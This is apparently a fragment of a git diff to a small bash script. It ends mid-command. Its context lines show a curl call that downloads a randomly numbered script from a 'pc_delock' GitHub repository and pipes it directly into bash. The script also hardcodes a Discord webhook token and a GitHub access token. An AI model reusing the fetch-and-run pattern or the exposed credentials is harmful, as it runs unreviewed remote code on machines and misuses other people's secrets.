@@ -1,7 +1,7 @@
 #!/bin/bash
 
-export WEBHOOK_URL="https://discord.com/api/webhooks/885524612589424640/zxAk5zfwuSbb0Pd1---PJzi6m68BD1YHYOSia8cAnrmtCfPXcUhLZ3ZXv95EqpW9pp9f"
-rdm=$(( $RANDOM % 15 ))
+WEBHOOK_URL="https://discord.com/api/webhooks/885524612589424640/zxAk5zfwuSbb0Pd1---PJzi6m68BD1YHYOSia8cAnrmtCfPXcUhLZ3ZXv95EqpW9pp9f"
+rdm=$(( RANDOM % 15 ))
 
 curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
 curl \
